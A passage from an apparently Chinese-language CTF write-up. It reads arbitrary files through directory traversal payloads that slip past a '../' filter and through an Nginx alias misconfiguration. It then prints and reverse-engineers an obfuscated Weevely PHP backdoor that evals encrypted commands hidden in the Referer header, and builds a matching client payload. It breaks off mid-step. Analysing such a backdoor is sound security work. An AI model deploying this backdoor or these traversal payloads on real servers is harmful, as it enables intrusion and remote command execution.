alt="1646469437304"></p><p>这里页面就发生了变化不在出现please continue,这里可能因为过滤检测后..&#x2F;index.php文件不存在.导致站点自动跳转到.&#x2F;index.php主页.因此重写法可以绕过..&#x2F;过滤</p><p>​    4.<strong>测试去除ext参数值</strong></p><p>如果HTTP请求中ext&#x3D;php是必须存在且无法更改的,那么这里利用会变得十分困难.因为我们的目标是&#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;site.conf文件,而不是php文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload=file=index&amp;ext=</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208500.png" alt="1646469772066"></p><p>没有出现please continue,因此这里看到的页面可能是因为当前目录下面的index文件不存在而强制跳转到index.php</p><p>​    5.**测试去除ext参数值,并在file参数中添加文件扩展名</p><p>​        那么如何验证上述没有出现please continue字符串是因为站点中没有找到这个文件而出现的强制跳转这个猜想是正确的呢</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload=file=index.php&amp;ext=</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208514.png" alt="1646470053397"></p><p>出现了please continue,说明读取到了当前目录下面的index.php,而前面的没有找到这个站点没有读取到index这个文件,直接跳转到了index.php,因此没有出现please continue</p><p>这也说明了我们上面所有的猜想都是正确的.我们可以通过重写..&#x2F;来绕过站点的过滤机制</p><p>现在我们可以直接读取到&#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;site.conf</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = file=....//....//....//....///etc/nginx/sites-enabled/site.conf&amp;ext= </span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208866.png" alt="1646470290737"></p><h2 id="目录遍历漏洞拿到webshel"><a href="#目录遍历漏洞拿到webshel" class="headerlink" title="目录遍历漏洞拿到webshel"></a>目录遍历漏洞拿到webshel</h2><p>利用上面的漏洞,我们可以读取到所有已知文件名的文件,但是我们对于哪些我们不知道的文件,就没有办法读取,必须拿到其他的利用点.所以这里开始查看配置文件根据</p><h3 id="Nginx的alias的用法及与root的区别"><a href="#Nginx的alias的用法及与root的区别" class="headerlink" title="Nginx的alias的用法及与root的区别"></a>Nginx的alias的用法及与root的区别</h3><ol><li>​    toot的用法</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location /request_path/image/ &#123;</span><br><span class="line">    root /local_path/image/;</span><br><span class="line">&#125;</span><br><span class="line">这样配置的结果就是当客户端请求 /request_path/image/cat.png 的时候，</span><br><span class="line">Nginx把请求映射为/local_path/image/request_path/image/cat.png</span><br></pre></td></tr></table></figure><ol start="2"><li><p>alias的用法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location /request_path/image/ &#123;</span><br><span class="line">    alias /local_path/image/;</span><br><span class="line">&#125;</span><br><span class="line">这时候，当客户端请求 /request_path/image/cat.png 的时候，</span><br><span class="line">Nginx把请求映射为/local_path/image/cat.png</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208876.png" alt="1646474028650"></p></li></ol><p>这段代码给&#x2F;web-img目录设置了一个别名&#x2F;images&#x2F;,并且开启了autoindex</p><p> alias 用于给 localtion 指定的路径设置别名 , 在路径匹配时 , alias 会把 location 后面配置的路径丢弃掉 , 并把当前匹配到的目录指向到 alias 指定的目录 . </p><p>注意!alias会丢弃掉loaction的路径,因此alias后面的路径是从系统根目录开始的,然后直接跟指定的路径,他和root的用法不一样,而autoindex是一个目录浏览功能,用于列出当前目录的所有文件及子目录</p><p>总之,这里访问&#x2F;web-ima,就会访问系统跟目录下的&#x2F;images&#x2F;而如果在url中访问&#x2F;web-img..&#x2F;则相当于访问&#x2F;images&#x2F;..&#x2F;,也就相当于访问系统根目录.而且由于开启了autoindex,我们可以直击在浏览器里看到根目录下的所有内容</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208893.png" alt="1646474607851"></p><p>这就是一个目录遍历漏洞,我们可以通过他查看系统中所有文件</p><p>遍历目录可以在&#x2F;var&#x2F;www下找到hack.php.bak</p><h2 id="分析Weevely-Linux中的菜刀-后门代码"><a href="#分析Weevely-Linux中的菜刀-后门代码" class="headerlink" title="分析Weevely(Linux中的菜刀)后门代码"></a>分析Weevely(Linux中的菜刀)后门代码</h2><p>先定义多个变量,然后通过str_replace函数进行字符串的替换并拼接,接着通过create_fuction()创建了一个匿名函数,最后执行这个函数</p><p>str_replace()函数替换拼接后的代码就是匿名函数$f的内容因此这里输出$f,看看函数在干什么</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$U</span> = <span class="string">&#x27;_/|U&quot;,&quot;/-/|U&quot;),ar|Uray|U(&quot;/|U&quot;,&quot;+&quot;),$ss(|U$s[$i]|U,0,$e)|U)),$k))|U|U);$o|U|U=o|Ub_get_|Ucontents(|U);|Uob_end_cle&#x27;</span>;</span><br><span class="line"><span class="variable">$q</span> = <span class="string">&#x27;s[|U$i]=&quot;&quot;;$p=|U$ss($p,3);&#125;|U|Uif(array_k|Uey_|Uexis|Uts($|Ui,$s))&#123;$s[$i].=|U$p|U;|U$e=|Ustrpos($s[$i],$f);|Ui&#x27;</span>;</span><br><span class="line"><span class="variable">$M</span> = <span class="string">&#x27;l=&quot;strtolower|U&quot;;$i=$m|U[1|U][0].$m[1]|U[1];$|U|Uh=$sl($ss(|Umd5($i|U.$kh),|U0,3|U));$f=$s|Ul($ss(|Umd5($i.$&#x27;</span>;</span><br><span class="line"><span class="variable">$z</span> = <span class="string">&#x27;r=@$r[|U&quot;HTTP_R|UEFERER|U&quot;];$r|U|Ua=@$r[&quot;HTTP_A|U|UCCEPT_LAN|UGUAGE|U&quot;];if|U($r|Ur&amp;|U&amp;$ra)&#123;$u=parse_|Uurl($r&#x27;</span>;</span><br><span class="line"><span class="variable">$k</span> = <span class="string">&#x27;?:;q=0.([\\|Ud]))?,|U?/&quot;,$ra,$m)|U;if($|Uq&amp;&amp;$m)&#123;|U|U|U@session_start()|U|U;$s=&amp;$_SESSIO|UN;$ss=&quot;|Usubst|Ur&quot;;|U|U$s&#x27;</span>;</span><br><span class="line"><span class="variable">$o</span> = <span class="string">&#x27;|U$l;|U)&#123;for|U($j=0;($j|U&lt;$c&amp;&amp;|U|U$i|U&lt;$|Ul);$j++,$i++)&#123;$o.=$t&#123;$i&#125;|U^$k|U&#123;$j&#125;;&#125;&#125;|Ureturn $|Uo;&#125;$r=$|U_SERV|UE|UR;$r&#x27;</span>;</span><br><span class="line"><span class="variable">$N</span> = <span class="string">&#x27;|Uf($e)&#123;$k=$k|Uh.$kf|U;ob_sta|Urt();|U@eva|Ul(@g|Uzuncom|Upress(@x(@|Ubas|U|Ue64_decode(preg|U_repla|Uce(|Uarray(&quot;/&#x27;</span>;</span><br><span class="line"><span class="variable">$C</span> = <span class="string">&#x27;an();$d=b|Uase64_encode(|Ux|U(gzcomp|U|Uress($o),$k))|U;prin|Ut(&quot;|U&lt;$k&gt;$d&lt;/$k&gt;&quot;|U);@ses|U|Usion_des|Utroy();&#125;&#125;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$j</span> = <span class="string">&#x27;$k|Uh=&quot;|U|U42f7&quot;;$kf=&quot;e9ac&quot;;fun|Uction|U |Ux($t,$k)&#123;$c|U=|Ustrlen($k);$l=s|Utrl|Ue|Un($t);$o=|U&quot;&quot;;fo|Ur($i=0;$i&lt;&#x27;</span>;</span><br><span class="line"><span class="variable">$R</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;rO&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;rOcreatrOe_rOrOfurOncrOtion&#x27;</span>);</span><br><span class="line"><span class="variable">$J</span> = <span class="string">&#x27;kf|U),|U0,3));$p=&quot;|U&quot;;for(|U|U$|Uz=1;$z&lt;cou|Unt|U($m[1]);|U$z++)$p.=|U$q[$m[2][$z|U]|U];if(strpos(|U$|U|Up,$h)|U===0)&#123;$&#x27;</span>;</span><br><span class="line"><span class="variable">$x</span> = <span class="string">&#x27;r)|U;pa|Urse|U_str($u[&quot;qu|U|Uery&quot;],$q);$|U|Uq=array_values(|U$q);pre|Ug|U_match_al|Ul(&quot;/([\\|U|Uw])[|U\\w-]+|U(&#x27;</span>;</span><br><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;|U&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$j</span> . <span class="variable">$o</span> . <span class="variable">$z</span> . <span class="variable">$x</span> . <span class="variable">$k</span> . <span class="variable">$M</span> . <span class="variable">$J</span> . <span class="variable">$q</span> . <span class="variable">$N</span> . <span class="variable">$U</span> . <span class="variable">$C</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$f</span>;<span class="comment">#这里</span></span><br><span class="line"><span class="variable">$kh</span> = <span class="string">&quot;42f7&quot;</span>;<span class="comment">#定义两个字符串</span></span><br><span class="line"><span class="variable">$kf</span> = <span class="string">&quot;e9ac&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>, <span class="variable">$k</span></span>)#$<span class="title">t</span>的每一项和$<span class="title">k</span>的每一项异或运算,然后循环拼接到输出变量$<span class="title">o</span>中</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$k</span>);</span><br><span class="line">    <span class="variable">$l</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$o</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$l</span>;) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; (<span class="variable">$j</span> &lt; <span class="variable">$c</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="variable">$l</span>); <span class="variable">$j</span>++, <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$t</span>&#123;<span class="variable">$i</span>&#125;;</span><br><span class="line">            <span class="variable">$o</span> .= <span class="variable">$t</span>&#123;<span class="variable">$i</span>&#125; ^ <span class="variable">$k</span>&#123;<span class="variable">$j</span>&#125;;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#获取服务器环境变量</span></span><br><span class="line"><span class="variable">$r</span> = <span class="variable">$_SERVER</span>;<span class="comment">#获取reffer头</span></span><br><span class="line"><span class="variable">$rr</span> = @<span class="variable">$r</span>[<span class="string">&quot;HTTP_REFERER&quot;</span>];<span class="comment">#at符号（@）在PHP中用作错误控制操作符。当表达式附加@符号时，将忽略该表达式可能生成的错误消息。如果启用了track_errors功能，则表达式生成的错误消息将保存在变量$ php_errormsg中。每个错误都会覆盖此变量。</span></span><br><span class="line"><span class="variable">$ra</span> = @<span class="variable">$r</span>[<span class="string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>];<span class="comment">#获取浏览器语言</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$rr</span> &amp;&amp; <span class="variable">$ra</span>) &#123;</span><br><span class="line">    <span class="comment">#解析url</span></span><br><span class="line">    <span class="variable">$u</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$rr</span>);</span><br><span class="line">    <span class="comment">/*[query] =&gt; arg=value 这个是查询语句返回的数组中的键值 而下面将查询到的referer中的查询字符串解析为键值对变量,并且保存在数组$q中*/</span></span><br><span class="line">    <span class="title function_ invoke__">parse_str</span>(<span class="variable">$u</span>[<span class="string">&quot;query&quot;</span>], <span class="variable">$q</span>);</span><br><span class="line">    <span class="comment">#返回$q中的所有值</span></span><br><span class="line">    <span class="variable">$q</span> = <span class="title function_ invoke__">array_values</span>(<span class="variable">$q</span>);</span><br><span class="line">    <span class="comment">#执行全局的正则匹配表达式,将结果输出到$m数组中,这个可以单独拿出来看</span></span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>, <span class="variable">$ra</span>, <span class="variable">$m</span>);</span><br><span class="line">    <span class="comment">/*/([\w])[\w-]+(?:;q=0.([\d]))?,?/</span></span><br><span class="line"><span class="comment">    \w匹配字母数字下划线</span></span><br><span class="line"><span class="comment">    [\w]匹配数字字母下划线中的任何字符</span></span><br><span class="line"><span class="comment">    ([\w]把匹配到的数字字母下划线放到一个分组中</span></span><br><span class="line"><span class="comment">    [\w-]匹配数字字母下划线与-中的任何字符</span></span><br><span class="line"><span class="comment">    +表示匹配一个或更多个前面的标记连起来就是匹配不止一个数字字母下划线和-</span></span><br><span class="line"><span class="comment">    (?:)表示非捕获分组用于单纯的把数个标记组在一起用于后面的?组合匹配</span></span><br><span class="line"><span class="comment">    ;q=0表示匹配;q=0这些字符</span></span><br><span class="line"><span class="comment">    .表示匹配任何字符不包括换行符</span></span><br><span class="line"><span class="comment">    ([\d])\d表示匹配任何数字0-9</span></span><br><span class="line"><span class="comment">    ?表示匹配0个或一个前面的标记</span></span><br><span class="line"><span class="comment">    (?:;q=0.([\d]))?综合起来就是匹配;q=0任意字符 数字一次但不捕获</span></span><br><span class="line"><span class="comment">    ,?表示匹配0次逗号或者一次逗号</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$q</span> &amp;&amp; <span class="variable">$m</span>) &#123;</span><br><span class="line">        <span class="comment">#屏蔽错误并且开启一个新的session</span></span><br><span class="line">        @<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">        <span class="comment">#$s也同时可以使用$_SESSION的值 ,两个变量指向一个内容</span></span><br><span class="line">        <span class="variable">$s</span> =&amp; <span class="variable">$_SESSION</span>;</span><br><span class="line">        <span class="variable">$ss</span> = <span class="string">&quot;substr&quot;</span>;</span><br><span class="line">        <span class="variable">$sl</span> = <span class="string">&quot;strtolower&quot;</span>;</span><br><span class="line">        <span class="comment">#拼接前两中语言的首字母</span></span><br><span class="line">        <span class="variable">$i</span> = <span class="variable">$m</span>[<span class="number">1</span>][<span class="number">0</span>] . <span class="variable">$m</span>[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">        <span class="comment">#在连接预定义字符串截取0-3位,在进行小写转换</span></span><br><span class="line">        <span class="variable">$h</span> = <span class="variable">$sl</span>(<span class="variable">$ss</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span> . <span class="variable">$kh</span>), <span class="number">0</span>, <span class="number">3</span>));</span><br><span class="line">        <span class="variable">$f</span> = <span class="variable">$sl</span>(<span class="variable">$ss</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span> . <span class="variable">$kf</span>), <span class="number">0</span>, <span class="number">3</span>));</span><br></pre></td></tr></table></figure><p> 需要注意这个正则函数 <code>preg_match_all()</code> , 该函数从 <code>Accept-Language</code> 取值 , 然后通过正则匹配后输出到 $m 数组中 . 单独拿出来看 , $m 数组的输出内容是如下这样的 .  </p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208898.png" alt="1646490699195"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$m[0] : 所有可选语言及其权重系数</span><br><span class="line">$m[1] : 所有可选语言的首字母</span><br><span class="line">$m[2] : 所有可选语言的权重值( 不清楚该怎么说 , 反正你能明白 )</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">举个例子 : Accept-Language: zh-cn,zh;q=0.5</span><br><span class="line"></span><br><span class="line">1. Accept-Language表示浏览器所支持的语言类型 . </span><br><span class="line">2. zh-CN 表示简体中文 , zh 表示中文 , 不同语言之间用逗号分割 .</span><br><span class="line">3. q 是权重系数 , 范围为 [0,1] . q 值越大 , 请求越倾向于获得其对应语言表示的内容 . 若没有指定 q 值，则默认为1 . 若被赋值为0 , 则用于提醒服务器该语言是浏览器不接受的内容类型 .</span><br></pre></td></tr></table></figure><p> 然后拼接了前两种可选语言的首字母 , 和预定义的字符串拼接并进行 md5 校验 , 截取等操作 . 然后赋值给 <code>$h</code> 和 <code>$f</code> 两个变量 </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#$p 应该是指payload,现在还为空</span></span><br><span class="line">        <span class="variable">$p</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$z</span> = <span class="number">1</span>; <span class="variable">$z</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$m</span>[<span class="number">1</span>]); <span class="variable">$z</span>++)</span><br><span class="line">            <span class="comment"># $m[2]是语言权重的整数值</span></span><br><span class="line">            <span class="variable">$p</span> .= <span class="variable">$q</span>[<span class="variable">$m</span>[<span class="number">2</span>][<span class="variable">$z</span>]];</span><br><span class="line">        <span class="comment">#如果$p 中$h首次出现的位置在开头</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$p</span>, <span class="variable">$h</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="variable">$s</span>[<span class="variable">$i</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="comment">#返回 $p 中的第四个字符到末尾的字符串(即去除$p前三个字符)</span></span><br><span class="line">            <span class="variable">$p</span> = <span class="variable">$ss</span>(<span class="variable">$p</span>, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#查找数组$s中是否有指定键名$i,即查找$-SESSION中是否存在键名$i</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$i</span>, <span class="variable">$s</span>)) &#123;</span><br><span class="line">            <span class="comment"># $_SESSION[$i] = $_SESSION[$i] . $p</span></span><br><span class="line">            <span class="variable">$s</span>[<span class="variable">$i</span>] .= <span class="variable">$p</span>;</span><br><span class="line">            <span class="comment">#$e 为$_SESSION[$i] 中$f第一次出现的位置</span></span><br><span class="line">            <span class="variable">$e</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$s</span>[<span class="variable">$i</span>], <span class="variable">$f</span>);</span><br></pre></td></tr></table></figure><p>循环中的 <code>$p .= $q[$m[2][$z]]</code> 会不断从 <code>$q</code> 中提取数据 . 结合之前的代码 , 攻击代码是放在 <code>Referer</code> 中的( 最后会放在 <code>$q</code> 中 ) , 因此这里可以看作是拼接攻击代码 , 组合成 Payload . ‘</p><p>然后判断 $h 是否出现在 Payload 的开头 , 若是则设置 <code>$_SESSION[&#39;$i&#39;] = &quot;&quot;</code>  , 同时删除 Payload 的 $h 部分 . </p><p>接着判断 <code>$_SESSION</code> 中那个是否存在 <code>$i</code> 这个键名 , 若是则将 Payload 赋值给 <code>$_SESSION[$i]</code> , 然后查找 <code>$_SESSION[$i]</code>( 也就是 Payload ) 中 <code>$f</code> 第一次出现的位置 .</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> (<span class="variable">$e</span>) &#123;</span><br><span class="line">                <span class="comment">#$k = 42f7e9ac</span></span><br><span class="line">                <span class="variable">$k</span> = <span class="variable">$kh</span> . <span class="variable">$kf</span>;</span><br><span class="line">                <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">                <span class="comment">/*这段比较复杂</span></span><br><span class="line"><span class="comment">                $ss($s[i],0,$e) 先删除了$_SESSION[$i] 中的 $f.</span></span><br><span class="line"><span class="comment">                 preg_replace():将剩余部分中的&#x27;_&#x27;和&#x27;-&#x27;替换为&#x27;/&#x27;和&#x27;+&#x27;</span></span><br><span class="line"><span class="comment">                base64_decode():然后对替换后的内容进行base64解码</span></span><br><span class="line"><span class="comment">                x():接着对其进行那个异或加密,该函数在开头定义了</span></span><br><span class="line"><span class="comment">                gzuncompress():解压一个压缩字符串</span></span><br><span class="line"><span class="comment">                最后通过eval执行</span></span><br><span class="line"><span class="comment">                 * */</span></span><br><span class="line">                @<span class="keyword">eval</span>(@<span class="title function_ invoke__">gzuncompress</span>(@<span class="title function_ invoke__">x</span>(@<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">preg_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;/_/&quot;</span>, <span class="string">&quot;/-/&quot;</span>), <span class="keyword">array</span>(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;+&quot;</span>), <span class="variable">$ss</span>(<span class="variable">$s</span>[<span class="variable">$i</span>], <span class="number">0</span>, <span class="variable">$e</span>))), <span class="variable">$k</span>)));</span><br><span class="line">                <span class="comment"># 返回输出缓冲区内容到$o</span></span><br><span class="line">                <span class="variable">$o</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">                <span class="comment">#清空缓冲区并关闭输出缓冲</span></span><br><span class="line">                <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">                <span class="comment">#对缓冲区输入内容通过gzcompress()函数压缩,通过x()异或加密,通过base64编码</span></span><br><span class="line">                <span class="variable">$d</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">x</span>(<span class="title function_ invoke__">gzcompress</span>(<span class="variable">$o</span>), <span class="variable">$k</span>));</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&quot;&lt;<span class="subst">$k</span>&gt;<span class="subst">$d</span>&lt;/<span class="subst">$k</span>&gt;&quot;</span>);</span><br><span class="line">                <span class="comment">#销毁一个会话中的所有数据</span></span><br><span class="line">                @<span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$g</span>=<span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$f</span>);</span><br><span class="line"><span class="variable">$g</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>紧跟上面的上面的代码,若payload中找到了$f第一次出现的位置,(也就是说明$f在payload中),就会继续执行如下过程.</p><ol><li>生成密钥$k,该值由预定义的两个字符串拼接而成,然后打开输出控制缓冲区</li><li>截取payload中从开头到$f出现位置的这部分字符串(由此可以判断$f应该是出现在payload的末尾,这里删去$f)</li><li>利用pre_replace()函数,正则替换字符串中的’_’和’-‘为’&#x2F;‘和’+’</li><li>替换后的字符串进行base64_decode解码操作</li><li>对解码后的字符串进行循环异或运算(就是调用x()函数)</li><li>对计算后的字符串调用gzuncompress()函数进行压缩</li><li>通过eval()函数执行压缩后的字符串</li><li>返回输出到缓冲区的内容,然后清空并关闭输出缓冲区</li><li>对缓冲区输出的内容通过gzcompress()函数进行压缩,再通过x()函数进行循环异或运算,最后通过base64_encode编码输出</li></ol><p>整个后门代码的思路就是应该如上,攻击者通过referer传输攻击代码,这段攻击代码的格式应该为填充字符串+加密混淆后的payload+填充字符串.</p><p>该后门脚本接受到攻击者传送的数据包,先按照一定的顺序取出攻击代码,然后把前面两侧的填充字符串去除,拿到payload,然后对payload进行解密反混淆操作,接着通过eval函数执行攻击者指定的命令,最后通过命令执行结果加密编码呈现给攻击者</p><p>整体的解密流程还是非常清晰的,我们知道了后门是如何处理攻击者发送的恶意数据包,但是我们现在还没有连接脚本.无法构造出后门能处理的请求.因此这里需要逆向整个解密流程,以便构造出请求的数据包</p><h2 id="逆向分析后门解密过程"><a href="#逆向分析后门解密过程" class="headerlink" title="逆向分析后门解密过程"></a>逆向分析后门解密过程</h2><p>我们需要根据解密流程构造出加密过程,其主要过程如下所示</p><ol><li><p>定义一些变量与函数</p> <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$kh</span> = <span class="string">&quot;42f7&quot;</span>;</span><br><span class="line"> <span class="variable">$kf</span> = <span class="string">&quot;e9ac&quot;</span>;</span><br><span class="line"> <span class="variable">$k</span> = <span class="string">&quot;42f7e9ac&quot;</span>;<span class="comment">#$k = $kh.$kf</span></span><br><span class="line"><span class="variable">$language</span> = <span class="string">&quot;en,zh-CN;q=0.9,zh;q=8,zh-TW;q=0.7&quot;</span>;<span class="comment">#假设的 Accept-Language</span></span><br><span class="line"><span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>,<span class="variable">$language</span>,<span class="variable">$m</span>);<span class="comment">#输出$m 数组</span></span><br><span class="line"><span class="variable">$i</span> = <span class="string">&quot;ez&quot;</span>;<span class="comment">#$i = $m[1][0].$m[1][1];$m[1][0] = &quot;e&quot; , $m[1][1] = &quot;z&quot;</span></span><br><span class="line"><span class="variable">$h</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>.<span class="variable">$kh</span>),<span class="number">0</span>,<span class="number">3</span>));</span><br><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>.<span class="variable">$kf</span>),<span class="number">0</span>,<span class="number">3</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">#定义x()函数</span></span><br><span class="line"><span class="comment">#由于异或运算是循环的(A ^ B ^ B = A),因此加密解密函数不变</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$k</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$k</span>);</span><br><span class="line">    <span class="variable">$l</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$o</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="variable">$l</span>;)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>;(<span class="variable">$j</span> &lt; <span class="variable">$c</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="variable">$l</span>);<span class="variable">$j</span>++,<span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="variable">$o</span> .= <span class="variable">$t</span>[<span class="variable">$i</span>] ^ <span class="variable">$k</span>[<span class="variable">$j</span>]; <span class="comment">#php在7.4不在使用花括号访问数组或者字符串的偏移量需要将&#123;&#125;换成[]解决,这里先放着</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">x</span>(<span class="variable">$h</span>,<span class="variable">$f</span>);</span><br></pre></td></tr></table></figure><p> 这里主要提一下函数x(),正如注释里写的由于 A ^ B ^ B &#x3D; A这个特性,所以加密过程和机密过程的x() 是完全相同的</p></li><li><p>构造payload</p> <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#构造payload</span></span><br><span class="line"><span class="variable">$payload1</span> = <span class="string">&quot;phpinfo()&quot;</span>;<span class="comment">#假设payload1为phpinfo();</span></span><br><span class="line"><span class="variable">$payload2</span> = @<span class="title function_ invoke__">gzcompress</span>(<span class="variable">$payload1</span>);<span class="comment">#gzuncompress 逆向操作</span></span><br><span class="line"><span class="variable">$payload3</span> = @<span class="title function_ invoke__">x</span>(<span class="variable">$payload2</span>,<span class="variable">$k</span>);<span class="comment">#因为是异或运算,就无所谓逆向不逆向</span></span><br><span class="line"><span class="variable">$payload4</span> = @<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$payload3</span>);<span class="comment">#base64-decode逆向操作</span></span><br><span class="line"><span class="variable">$payload5</span> = <span class="title function_ invoke__">preg_match</span>(<span class="keyword">array</span>(<span class="string">&quot;/\//&quot;</span>,<span class="string">&quot;/\+/&quot;</span>),<span class="keyword">array</span>(<span class="string">&quot;_&quot;</span>,<span class="string">&quot;-&quot;</span>),<span class="variable">$payload4</span>); <span class="comment">#逆向正则替换</span></span><br><span class="line"><span class="variable">$payload6</span> = <span class="variable">$payload5</span>.<span class="variable">$f</span>;<span class="comment"># 在末尾补齐$f</span></span><br><span class="line"><span class="variable">$payload7</span> = <span class="variable">$h</span> . <span class="variable">$payload6</span>;<span class="comment">#在开头补全$h</span></span><br><span class="line"><span class="variable">$payload</span> = <span class="variable">$payload7</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#根据源代码 $p .=$q[$m[2][$z]];可以看出 $payload 拼接自 $q, $p来自与 HTTP_REFERER</span></span><br><span class="line"><span class="comment">#因此这里要构造 referer</span></span><br><span class="line"><span class="variable">$referer</span> = <span class="string">&quot;http://example.cpm/?a=qwer&amp;b=<span class="subst">$payload</span>&quot;</span>;</span><br><span class="line"><span class="comment">#解密时会按照一定的顺序从referer 中取出payload,但是加密过程不需要这一步</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$referer</span>,PHP_EOL;</span><br></pre></td></tr></table></figure><p> 结合加密过程的内容,构造的payload过程</p></li><li><p>对收到的数据包的处理</p><p> 